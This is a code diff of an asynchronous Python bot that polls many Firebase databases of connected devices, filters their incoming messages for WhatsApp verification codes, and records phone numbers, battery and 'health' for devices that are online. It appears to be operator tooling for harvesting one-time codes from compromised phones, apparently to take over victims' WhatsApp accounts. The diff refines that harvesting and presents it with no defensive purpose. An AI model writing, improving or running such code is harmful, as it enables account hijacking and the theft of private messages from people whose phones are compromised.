@@ -48,9 +48,7 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
                 detected_service = fbu.extract_service_name(text, sender)
                 text_lower = text.lower()
                 
-                # 🚨 STRICT FILTER: WhatsApp / Telegram
                 if service_filter == "whatsapp":
-                    # WhatsApp ka message hona chahiye (code format ya whatsapp word)
                     if "whatsapp" not in text_lower and not re.search(r'code:\s*\d{3}-\d{3}', text):
                         continue
                     detected_service = "WhatsApp"
@@ -115,7 +113,6 @@ async def whatsapp_scanner(bot):
             ready_lines = {}
             now = time.time()
             
-            # Sabhi firebases ko scan karo
             for i in range(0, len(fbs), 5):
                 chunk = fbs[i:i+5]
                 for fb in chunk:
@@ -124,7 +121,8 @@ async def whatsapp_scanner(bot):
                     
                     for dev_id, c in clients.items():
                         if not isinstance(c, dict): continue
-                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 3600) * 1000)
+                        # Only save if online
+                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
                         
                         if is_online:
                             msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
@@ -145,11 +143,14 @@ async def whatsapp_scanner(bot):
                                 best_nums = fbu.extract_best_numbers(c, msgs)
                                 if best_nums:
                                     num = best_nums[0][0]
-                                    health = fbu.calculate_health(msgs)
+                                    # 🚨 REAL DATA SAVE
+                                    real_battery = str(c.get("battery", "0")).replace("%", "")
+                                    real_health = fbu.calculate_health(msgs)
                                     
                                     ready_lines[dev_id] = {
                                         "fb_url": fb['url'], "auth": fb.get("auth", ""),
-                                        "number": num, "chance": 99, "health": health,
+                                        "number": num, "chance": 99, "health": real_health,
+                                        "battery": real_battery,
                                         "time": int(now), "sort_id": latest_id
                                     }
             
@@ -162,6 +163,7 @@ async def whatsapp_scanner(bot):
             log.error(f"WA Scanner error: {e}")
         await asyncio.sleep(60)
 
+# Backup scanner same rahega...
 async def backup_scanner(bot):
     log.info("Backup Scanner Started...")
     while True:
